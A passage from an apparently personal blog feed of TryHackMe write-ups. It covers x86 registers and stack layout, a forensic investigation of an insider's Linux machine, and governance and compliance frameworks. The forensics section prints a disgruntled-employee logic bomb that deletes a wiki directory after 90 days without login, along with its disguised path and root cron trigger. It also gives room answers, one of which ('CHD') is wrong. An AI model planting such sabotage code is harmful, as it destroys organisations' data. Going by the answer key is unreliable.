a time.</li> </ul> <h3 id="segment-registers">Segment Registers</h3> <p>Segment Registers are 16-bits registers that divide the memory space into different segment for easier addressing.</p> <ul> <li><strong>Code Segment</strong>: The Code Segment (CS ) register points to the Code section in the memory.</li> <li><strong>Data Segment</strong>: The Data Segment (DS) register points to the program’s data section in the memory.</li> <li><strong>Stack Segment</strong>: The Stack Segment (SS) register points to the program’s Stack in the memory.</li> <li><strong>Extra Segments</strong> (ES, FS, and GS): These extra segment registers point to different data sections. These and the DS register divide the program’s memory into four distinct data sections.</li> </ul> <p>Here is a summary of the different mainly used registers available.</p> <table> <thead> <tr> <th style="text-align: center">General Registers</th> <th style="text-align: center">Segment Registers</th> <th style="text-align: center">Status Registers</th> <th style="text-align: center">Instruction Pointer</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">RAX, EAX, AX, AH, AL</td> <td style="text-align: center">CS</td> <td style="text-align: center">EFLAGS</td> <td style="text-align: center">EIP, RIP</td> </tr> <tr> <td style="text-align: center">RBX, EBX, BX, BH, BL</td> <td style="text-align: center">SS</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">RCX, ECX, CX, CH, CL</td> <td style="text-align: center">DS</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">RDX, EDX, DX, DH, DL</td> <td style="text-align: center">ES</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">RBP, EBP, BP</td> <td style="text-align: center">FS</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">RSP, ESP, SP</td> <td style="text-align: center">GS</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">RSI, ESI, SI</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">RDI, EDI, DI</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> <tr> <td style="text-align: center">R8-R15</td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> <td style="text-align: center"> </td> </tr> </tbody> </table> <h3 id="questions-2">Questions</h3> <p><strong>Which flag is used by the program to identify if it is being run in a debugger?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Trap Flag</code></em></p> <p><strong>Which flag will be set when the most significant bit in an operation is set to 1?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Sign Flag</code></em></p> <p><strong>Which Segment register contains the pointer to the code section in memory?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Code Segment</code></em></p> <h2 id="task-5---memory-overview">Task 5 - Memory Overview</h2> <p>When a program is loaded into the memory of an OS, it sees an abstracted view of memory. This means that the program does not have access to the full memory; instead it only has access to its own memory and for it, it is all the memory it needs to operate. Here, we are looking at the memory as a program sees it.</p> <p>Memory can be devided into different section, named Stack, Heap, Code and Data.</p> <ul> <li><strong>Code</strong>: This section contains the program’s code. Specifically, this section refers to the text section in a Portable Executable (PE) file, which includes instructions executed by the CPU. This section of memory has execute permissions, meaning that the CPU can execute the data here.</li> <li><strong>Data</strong>: This section contains initialized data that is constant. This section refers to the data section in a PE file. It often contains global variables and other data that are not supposed to change during the program execution.</li> <li><strong>Heap</strong>: This section is also known as Dynamic Memory, contains variables and data created and destroyed during program execution. When a variable is created, memory is allocated for that variable at runtime and when that variable is deleted, the memory is freed.</li> <li><strong>Stack</strong>: This section contains local variables, arguments passed onto the program and the return address of the parent process that called the program. Since the return address is related to the control flow of CPU’s instructions, the stack is often targeted by malware to hijack it.</li> </ul> <h3 id="questions-3">Questions</h3> <p><strong>When a program is loaded into Memory, does it have a full view of the system memory? Y or N?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">N</code></em></p> <p><strong>Which section of the Memory contains the code?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Code</code></em></p> <p><strong>Which Memory section contains information related to the program’s control flow?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Stack</code></em></p> <h2 id="task-6---stack-layout">Task 6 - Stack Layout</h2> <p>The Stack is a part of a program’s memory that contains the arguments passed to the program, the local variables, and the program’s control flow. This makes the stack very important regarding malware analysis and reverse engineering. Malware often exploits the stack to hijack the control flow of the program.</p> <p>The stack is a Last In First Out (LIFO) memory. This means the last element pushed onto the stack will be the first one to be popped out.</p> <table> <thead> <tr> <th style="text-align: center">Pushed order</th> <th style="text-align: center">Popped order</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">A, B, C</td> <td style="text-align: center">C, B, A</td> </tr> </tbody> </table> <p>The two registers to keep track of the stack are the Stack Pointer (ESP/RSP) and Base Pointer (EBP/RBP).</p> <ul> <li><strong>Stack Pointer</strong>: It points to the top of the stack, when any new element is pushed on the stack, the location of the SP changes to consider the new element and does the same thing when an element is popped out.</li> <li><strong>Base Pointer</strong>: It remains constant for any program. This is the reference address where the current program stack tracks its local variables and arguments.</li> <li><strong>Arguments</strong>: Arguments being passed to a function are pushed to the stack before the function starts execution. These arguments are present right below the Return Address on the stack.</li> </ul> <h3 id="old-base-pointer-and-return-address">Old Base Pointer and Return Address</h3> <p>Below the BP lies the old Base Pointer of the program that calls the current program and below the oBP lies the Return Address, where the Instruction Pointer will return once the current program’s execution ends.<br/> A common technique to hijack the control flow is to overflow a local variable on the stack such that it overwrites the Return Address ith an address of the malware author’s choice. This technique is called a Stack Buffer Overflow.</p> <h3 id="function-prologue-and-epilogue">Function Prologue and Epilogue</h3> <p>When a function is called, the stack is prepared for the function to be executed. This means that the arguments are pushed to the stack before the function execution. After that, Return Address and old Base Pointer are pushed onto the stack. Once these elements are pushed, the Base Pointer is pushed into the stack. As the function executes, the Stack Pointer, which pointed to BP, now moves as the requirement of the function. This portion of code is called the Function Prologue.</p> <p>Similarly, the oBP is pushed into the BP when the function exits. The Return Address is pushed into the Instruction Pointer and the Stack pointer is rearranged to point to the top of the stack. This portion of code is called the Function Epilogue.</p> <figure> <picture> <img src="/assets/img/images/thm_x86_architecture_overview/ryr5vkkxA.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="Stack Diagram" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question">Question</h3> <p><strong>Follow the instructions in the attached static site and find the flag. What is the flag?</strong></p> <p>Copy the Stack Diagram.</p> <p><em>Answer <code class="language-plaintext highlighter-rouge">THM{SMASHED_THE_STACK}</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>In this room, we explored the fundamental components of x86 CPU architecture, including the Von Neumann model, CPU components such as ALU and Control Unit, various types of registers, memory layout, and the organization of the stack.<br/> Understanding these concepts is crucial for analyzing malware behavior and gaining insights into system operations. By grasping the role of registers, memory sections, and stack layout, one can delve deeper into computer architecture and enhance their skills in cybersecurity and reverse engineering.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="x86 Architecture"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM CTF Disgruntled</title><link href="https://nonohm.github.io/blog/2024/THM-CTF-Disgruntled/" rel="alternate" type="text/html" title="THM CTF Disgruntled"/><published>2024-03-31T16:08:51+00:00</published><updated>2024-03-31T16:08:51+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-CTF-Disgruntled</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-CTF-Disgruntled/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we will have to investigate into the CyberT’s IT departement guy’s machine to check if he has done anything malicious to CyberT’s assets.</p> <h2 id="task-3---nothing-suspicious-so-far">Task 3 - Nothing suspicious… So far</h2> <p>To start with, we check information about the OS with <code class="language-plaintext highlighter-rouge">cat /etc/os-release</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">NAME</span><span class="o">=</span><span class="s2">"Ubuntu"</span>
<span class="nv">VERSION</span><span class="o">=</span><span class="s2">"18.04.5 LTS (Bionic Beaver)"</span>
<span class="nv">ID</span><span class="o">=</span>ubuntu
<span class="nv">ID_LIKE</span><span class="o">=</span>debian
<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">"Ubuntu 18.04.5 LTS"</span>
<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">"18.04"</span>
<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/"</span>
<span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">"https://help.ubuntu.com/"</span>
<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">"https://bugs.launchpad.net/ubuntu/"</span>
<span class="nv">PRIVACY_POLICY_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span>
<span class="nv">VERSION_CODENAME</span><span class="o">=</span>bionic
<span class="nv">UBUNTU_CODENAME</span><span class="o">=</span>bionic
</code></pre></div></div> <p>We can see that this is a normal Ubuntu 18.04.5.</p> <p>Then, we check what are the users on the machine in the <code class="language-plaintext highlighter-rouge">passwd</code> file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
cybert:x:1001:1001::/home/cybert:/bin/bash
it-admin:x:1002:1002:,,,:/home/it-admin:/bin/bash
</code></pre></div></div> <p>These three users are the only “normal” ones available on the system.</p> <p>When we look into sudoers file, we can see <em>cybert</em> and <em>it-admin</em> have all privileges on the system.</p> <pre><code class="language-sudoers"># User privilege specification
root    ALL=(ALL:ALL) ALL
cybert  ALL=(ALL:ALL) ALL
it-admin ALL=(ALL:ALL) ALL
</code></pre> <p>Instructions gives us a hint to look if there is any installed package using privileged account. Thus, we will look for anyone who had used the <code class="language-plaintext highlighter-rouge">apt</code> command using <code class="language-plaintext highlighter-rouge">cat /var/log/auth.log* | grep -i apt</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dec 28 06:19:01 ip-10-10-168-55 <span class="nb">sudo</span>:   cybert : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/cybert <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/apt <span class="nb">install </span>dokuwiki
</code></pre></div></div> <p>We can see that user <em>cybert</em> has installed <em>dokuwiki</em>.</p> <p>To know what DokuWiki is, it is an open-source wiki software that enables easy collaborative website content management through text files, without requiring a database backend.</p> <p>It looks like a normal package to install.</p> <h3 id="questions">Questions</h3> <p><strong>The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/usr/bin/apt install dokuwiki</code></em></p> <p><strong>What was the present working directory (PWD) when the previous command was run?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/home/cybert</code></em></p> <h2 id="task-4---lets-see-if-you-did-anything-bad">Task 4 - Let’s see if you did anything bad</h2> <p>The instructions here says that IT was supposed to only install a service so we need to check if there is unrelated commands.</p> <p>We can see it in the cybert’s bash history using the command <code class="language-plaintext highlighter-rouge">cat /home/cybert/.bash_history</code>.</p> <p>Here are the suspicious commands we could find:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>adduser it-admin
<span class="nb">sudo </span>visudo
su it-admin
<span class="nb">exit
sudo </span>passwd root
su root
<span class="nb">exit
</span>su root
nano /etc/ssh/sshd_config 
<span class="nb">sudo </span>nano /etc/ssh/sshd_config 
</code></pre></div></div> <p>It seems that the IT guy have added a new user named <em>it-admin</em> changed sudoers file, changed root password and sshd configuration.</p> <p>We can see the sudoers file has been changed by user <em>cybert</em> on December 28 at 6:27 AM.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dec 22 07:58:24 ip-10-10-158-38 <span class="nb">sudo</span>:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/sbin/visudo
Dec 28 06:27:34 ip-10-10-168-55 <span class="nb">sudo</span>:   cybert : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/cybert <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/sbin/visudo
</code></pre></div></div> <p>When looking at the <em>it-admin</em>’s bash history with <code class="language-plaintext highlighter-rouge">cat /home/it-admin/.bash_history </code>, we are able to see a questionable script named <em>bomb.sh</em> downloaded by our friend.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.158.38:8080/bomb.sh <span class="nt">--output</span> bomb.sh
<span class="nb">sudo </span>vi bomb.sh
<span class="nb">ls
rm </span>bomb.sh
<span class="nb">sudo </span>nano /etc/crontab
<span class="nb">exit</span>
</code></pre></div></div> <h3 id="questions-1">Questions</h3> <p><strong>Which user was created after the package from the previous task was installed?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">it-admin</code></em></p> <p><strong>A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Dec 28 06:27:34</code></em></p> <p><strong>A script file was opened using the “vi” text editor. What is the name of this file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">bomb.sh</code></em></p> <h2 id="task-5---bomb-has-been-planted-but-when-and-where">Task 5 - Bomb has been planted. But when and where?</h2> <p>Here, we need to know where the script came from and what it contains.</p> <p>From the previous history command, we saw that the command used to retrieve the script is <code class="language-plaintext highlighter-rouge">curl 10.10.158.38:8080/bomb.sh --output bomb.sh</code>.</p> <p>By checking vi history using <code class="language-plaintext highlighter-rouge">cat /home/it-admin/.viminfo</code>, we see that the file has been saved somewhere else at <code class="language-plaintext highlighter-rouge">/bin/os-update.sh</code>. This explains why the <em>bomb.sh</em> has been deleted.</p> <pre><code class="language-vi"># Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
</code></pre> <p>Using <code class="language-plaintext highlighter-rouge">stat /bin/os-update</code>, we get information on when it has been last modified.</p> <pre><code class="language-stat">Access: 2022-12-28 06:29:43.998004273 +0000
Modify: 2022-12-28 06:29:43.998004273 +0000
Change: 2022-12-28 06:29:43.998004273 +0000
</code></pre> <p>Lastly, we need to know what this script does. In order to know that, we will check its content.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 2022-06-05 - Initial version</span>
<span class="c"># 2022-10-11 - Fixed bug</span>
<span class="c"># 2022-10-15 - Changed from 30 days to 90 days</span>
<span class="nv">OUTPUT</span><span class="o">=</span><span class="sb">`</span>last <span class="nt">-n</span> 1 it-admin <span class="nt">-s</span> <span class="s2">"-90days"</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="sb">`</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$OUTPUT</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">rm</span> <span class="nt">-r</span> /var/lib/dokuwiki
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA</span><span class="se">\n</span><span class="s2">-mistermeist3r
"</span> <span class="o">&gt;</span> /goodbye.txt
<span class="k">fi</span>
</code></pre></div></div> <p>We are now able to understand what the script does. Firstly, it gets if the user it-admin connected wihtin 90 days. Then, if not, it will erase the dokuwiki site and write a vengeance message into <em>goodbye.txt</em>. This is probably made to piss off the company if our friend got fired.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the command used that created the file bomb.sh?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">curl 10.10.158.38:8080/bomb.sh --output bomb.sh</code></em></p> <p><strong>The file was renamed and moved to a different directory. What is the full path of this file now?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/bin/os-update.sh</code></em></p> <p><strong>When was the file from the previous question last modified? (Format: Month Day HH:MM)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Dec 28 06:29</code></em></p> <p><strong>What is the name of the file that will get created when the file from the first question executes?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">goodbye.txt</code></em></p> <h2 id="task-6---following-the-fuse">Task 6 - Following the fuse</h2> <p>Now that we know how the script work, we need to know when it will be executed. We remember that our friend modified crontab file, so will check it with <code class="language-plaintext highlighter-rouge">cat /etc/crontab</code>.</p> <pre><code class="language-cron">0 8     * * *   root    /bin/os-update.sh
</code></pre> <p>This script will be executed at 8 AM every day by root user.</p> <h3 id="question">Question</h3> <p><strong>At what time will the malicious file trigger? (Format: HH:MM AM/PM)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">08:00 AM</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>In summary, our investigation into the Disgruntled THM CTF scenario revealed suspicious actions by an insider in CyberT’s IT department. By thoroughly examining user accounts, permissions (sudoers), logs, and command histories (bash and vim), we uncovered a hidden plan to harm the company’s systems and found a malicious script intended to cause damage. This script would delete all the files of the dokuwiki if the user has not logged into this machine in the last 90 days.<br/> This scenario emphasizes the need for strong security measures and proactive threat detection.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="CTF"/><category term="Linux"/><category term="Forensics"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Governance &amp;amp; Regulation</title><link href="https://nonohm.github.io/blog/2024/THM-Governance-&-Regulation/" rel="alternate" type="text/html" title="THM Governance &amp;amp; Regulation"/><published>2024-03-17T16:20:58+00:00</published><updated>2024-03-17T16:20:58+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Governance-&amp;-Regulation</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Governance-&amp;-Regulation/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In cybersecurity, where malicious actors relentlessly endeavour to exploit vulnerabilities in highly-sensitive systems, we have to combat these threats with a comprehensive approach to information security governance &amp; regulation. Such an approach requires establishing robust policies and guidelines and implementing rigorous monitoring and enforcement mechanisms to ensure compliance</p> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>Understanding the role and importance of governance and regulation in cyber security</li> <li>Gain an understanding of relevant international laws, regulations, policies, standards &amp; guidelines</li> <li>Understanding Governance, Risk Management &amp; Compliance (GRC) framework</li> <li>Develop &amp; raise own cyber security posture as per international standards, including ISO 27001, NIST 800-53, and many more</li> </ul> <h2 id="task-2---why-is-it-important">Task 2 - Why is it important?</h2> <h3 id="important-terminologies">Important Terminologies</h3> <ol> <li><strong>Governance</strong>: Managing and directing an organization/system to achieve its objectives and ensure compliance with laws, regulations, and standards.</li> <li><strong>Regulation</strong>: A rule/law enforced by a gorvening body to ensure compliance and protect against harm.</li> <li><strong>Compliance</strong>: The state of adhering to laws/regulations/standards that apply to an organization/system.</li> </ol> <h3 id="information-security-governance">Information Security Governance</h3> <p>Information Security Governance represents an organization’s established structure, policies, methods and guidelines designed to guarantee the privacy, reliability and accesibility of its information assets.</p> <p>To keep away unauthorized intrusion, an ISG should fall under the following processes:</p> <ul> <li><strong>Strategy</strong>: Developing and implementing a comprehensive information security strategy that aligns with the organisation’s overall business objectives.</li> <li><strong>Policies and procedures</strong>: Preparing policies and procedures that govern the use and protection of information assets.</li> <li><strong>Risk management</strong>: Conduct risk assessments to identify potential threats to the organisation’s information assets and implement risk mitigation measures.</li> <li><strong>Performance measurement</strong>: Establishing metrics and key performance indicators (KPIs) to measure the effectiveness of the information security governance program.</li> <li><strong>Compliance</strong>: Ensuring compliance with relevant regulations and industry best practices.</li> </ul> <h3 id="information-security-regulation">Information Security Regulation</h3> <p>Information security regulation refers to legal and regulatory frameworks that govern the use and protection of information assets. Regulations are designed to protect sensitive data from unauthorized access, theft, and misuse. GDPR in Europe is one of the many standards available out there.</p> <h3 id="key-benefits">Key Benefits</h3> <ul> <li>More robust security posture with releveant regulation compliance.</li> <li>Increased stakeholder confidence by proving implemented measures.</li> <li>Regulatory compliance to avoid legal and financial penalties.</li> <li>Better alignment with business objectives to ensure cost-effective security measures.</li> <li>Informed decision-making to se where security measures are the most needed.</li> <li>Competitive advantage by enhancing stakeholders trust.</li> </ul> <h3 id="relevant-laws-and-regulations">Relevant Laws and Regulations</h3> <table> <thead> <tr> <th style="text-align: center">Law/Regulation</th> <th style="text-align: center">Domain</th> <th style="text-align: center">Description</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">General Data Protection Regulation (GDPR)</td> <td style="text-align: center">Data Privacy &amp; Protection</td> <td style="text-align: center">GDPR is a regulation propagated by the European Union that sets strict requirements for how organisations handle and protect and secure the personal data of EU citizens and residents.</td> </tr> <tr> <td style="text-align: center">Health Insurance Portability and Accountability Act (HIPAA)</td> <td style="text-align: center">Healthcare</td> <td style="text-align: center">A US-based official law to maintain the sensitivity of health-related information of citizens.</td> </tr> <tr> <td style="text-align: center">Payment Card Industry Data Security Standard (PCI-DSS)</td> <td style="text-align: center">Financial</td> <td style="text-align: center">Set technical and operational requirements to ensure the secure handling, storage, processing, and transmission of cardholder data by merchants, service providers, and other entities that handle payment cards.</td> </tr> <tr> <td style="text-align: center">Gramm-Leach-Bliley Act (GLBA)</td> <td style="text-align: center">Financial</td> <td style="text-align: center">Financial companies must be sensitive to their customers’ nonpublic personal information (NPI), including implementing information security programs, providing privacy notices, and disclosing information-sharing practices.</td> </tr> </tbody> </table> <h3 id="questions">Questions</h3> <p><strong>The term used for legal and regulatory frameworks that govern the use and protection of information assets is called?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Regulation</code></em></p> <p><strong>Health Insurance Portability and Accountability Act (HIPAA) targets which domain for data protection?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Healthcare</code></em></p> <h2 id="task-3---information-security-frameworks">Task 3 - Information Security Frameworks</h2> <p>ISF provides a set of documents that outline the organisation’s approach to information security and governs how security is implemented, managed, and enforced within the organisation. This mainly includes:</p> <ul> <li><strong>Policies</strong>: A formal statement that outlines an organisation’s goals, principles, and guidelines for achieving specific objectives.</li> <li><strong>Standards</strong>: A document establishing specific requirements or specifications for a particular process, product, or service.</li> <li><strong>Guidelines</strong>: A document that provides recommendations and best practices (non-mandatory) for achieving specific goals or objectives.</li> <li><strong>Procedures</strong>: Set of specific steps for undertaking a particular task or process.</li> <li><strong>Baselines</strong>: A set of minimum security standards or requirements that an organisation or system must meet.</li> </ul> <h3 id="developing-governance-documents">Developing Governance Documents</h3> <ol> <li>Identify the scope and purpose of the document.</li> <li>Research and review relevant laws, regulations, industry standards, and best practice.</li> <li>Draft the document by writing clear and concise.</li> <li>Review and approval by experts.</li> <li>Implementation and communication to all relevent employees and stakeholders.</li> <li>Review and update periodically to stay up-to-date.</li> </ol> <h3 id="questions-1">Questions</h3> <p><strong>The step that involves periodic evaluation of policies and making changes as per stakeholder’s input is called?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Review and Update</code></em></p> <p><strong>A set of specific steps for undertaking a particular task or process is called?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Procedures</code></em></p> <h2 id="task-4---governance-risk-and-compliance-grc">Task 4 - Governance Risk and Compliance (GRC)</h2> <p>GRC focuses on steering the organisation’s overall governance, enterprise risk management, and compliance in an integrated manner. It helps to ensure the organization operates within relevant regulations and industry standards. It has three components:</p> <ol> <li><strong>Governance</strong>: Rules, processes and policies to steer the organization.</li> <li><strong>Risk Management</strong>: Day-to-day technical processes to mitigate the risk.</li> <li><strong>Compliance</strong>: Ensurements to meet standards and run legally.</li> </ol> <h3 id="how-to-develop-grc-program">How to Develop GRC Program</h3> <ol> <li>Define the scope and objectives for a branch or a company.</li> <li>Conduct a risk assessment by identifying the cyber risks.</li> <li>Develop policies and procedures to guide to the best practicies.</li> <li>Establish governance processes to ensure the GRC program is effecively managed and controlled.</li> <li>Implement controls and operations to mitigate risks identified in step 2.</li> <li>Monitor and measure performance to ensure the effectiveness of the program.</li> <li>Continuously improve the program.</li> </ol> <h3 id="questions-2">Questions</h3> <p><strong>What is the component in the GRC framework involved in identifying, assessing, and prioritising risks to the organisation?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Risk management</code></em></p> <p><strong>Is it important to monitor and measure the performance of a developed policy? (yea/nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">yea</code></em></p> <h2 id="task-5---privacy-and-data-protection">Task 5 - Privacy and Data Protection</h2> <p>In every sector, privacy and data protection regulations are critical as they deal with citizens’ Personally Identifiable Information (PII). Privacy regulations help ensure PII is handled and stored responsibly and ethically to establish trust between clients and actors.</p> <h3 id="general-data-protection-regulation-gdpr">General Data Protection Regulation (GDPR)</h3> <p><a href="https://gdpr-info.eu/">GDPR</a> is a data protection law implemented in 2018 in the EU. It applies to all business entities that conducts business in the EU and collect/stor/process data of EU residents. Companies can only collect personal data for a legitimate reason and must inform the owner about its processing. The three key points are:</p> <ul> <li><strong>Prior approval</strong> must be obtained before collecting any personal data.</li> <li>Personal data should be kept to a <strong>minimum</strong> and only collected when necessary.</li> <li><strong>Adequate measures</strong> are to be adopted to protect stored personal data.</li> </ul> <p>If these are not respected, penalties and fines could be charged against the company:</p> <ul> <li><strong>Tier 1</strong>: Unintended data collection, sharing data with third parties without consent, etc. Maximum penalty amounting to 4% of the organisation’s revenue or 20 million euros.</li> <li><strong>Tier 2</strong>: Data breach notifications, cyber policies, etc. The maximum fine for Tier 2 is 2% of the organisation’s revenue or 10 million euros.</li> </ul> <h3 id="payment-card-industry-data-security-standard-pci-dss">Payment Card Industry Data Security Standard (PCI DSS)</h3> <p><a href="https://www.pcisecuritystandards.org/">PCI DSS</a> is focused on maintaining secure card transactions and protecting against data theft and fraud. It requires strict control access to cardholder information and monitoring unauthorised access, using recommended measures such as web application firewalls and encryption. Online card-based transactions are the main target for this regulatory.</p> <h3 id="questions-3">Questions</h3> <p><strong>What is the maximum fine for Tier 1 users as per GDPR (in terms of percentage)?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <p><strong>In terms of PCI DSS, what does CHD stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CHD</code></em></p> <h2 id="task-6---nist-special-publications">Task 6 - NIST Special Publications</h2> <h3 id="nist-800-53">NIST 800-53</h3> <p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf">NIST 800-53</a> is a publication titled “Security and Privacy Controls for Information Systems and Organisations” developed by the National Institute of Standards and Technology. It serves as a framework for organizations to assess and enhance the security and privacy of their information systems and comply with various laws, regulations, and policies.</p> <p>NIST 800-53 Revision 5 organises security controls into twenty families, each addressing a specific security concern category.</p> <figure> <picture> <img src="/assets/img/images/thm_governance_&amp;_regulation/B1PdVo4Ap.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="NIST 800-53 Key Points" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="implmenting-nist-800-53">Implmenting NIST 800-53</h3> <p><strong>Program Management</strong> is one of the most crucial point of the framework. It dictates establishing, implementing, and monitoring organisation-wide programs for information security and privacy while safeguarding the processed, stored, or transmitted through systems. These subcontrols need to be implmented:</p> <figure> <picture> <img src="/assets/img/images/thm_governance_&amp;_regulation/Hyv1LoERT.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="PM Controls" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="compliance-best-practices">Compliance Best Practices</h3> <p>In order to comply to the best practices, businesses must follow these steps:</p> <ol> <li>Discover and classify data assets, information systems, and associated threats.</li> <li>Map these into the various NIST 800-53 families to create a structured approach for matching the organization’s demands easier.</li> <li>Manage governance structure by allocating duties to each family and outline them using access control</li> <li>Monitor data activity and user behaviour regularly and avaluate to ensure compliance.</li> </ol> <h3 id="nist-800-63b">NIST 800-63B</h3> <p>This special publication sets guidelines to help establish effective digital identity practices. It focuses on verifying indentities of individuals and giving levels of identity assurance. It offers adivces on using authentication factors, including passwords, biometrics, and tokens, and securely managing and storing user credentials.</p> <h3 id="questions-4">Questions</h3> <p><strong>Per NIST 800-53, in which control category does the media protection lie?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Physical</code></em></p> <p><strong>Per NIST 800-53, in which control category does the incident response lie?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Administrative</code></em></p> <p><strong>Which phase (name) of NIST 800-53 compliance best practices results in correlating identified assets and permissions?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Map</code></em></p> <h2 id="task-7---information-security-management-and-compliance">Task 7 - Information Security Management and Compliance</h2> <p><strong>Information Security</strong> (IS) management is the panning, execution and continuous administration of security measures. It <strong>protects information from unauthorized access, use, disclosure, interruption, alteration, and destruction</strong>. To achieve that, it involves risk assessment and identification, security controls and procedures development, incident response planning, and security awareness training.</p> <p><strong>Compliance</strong> 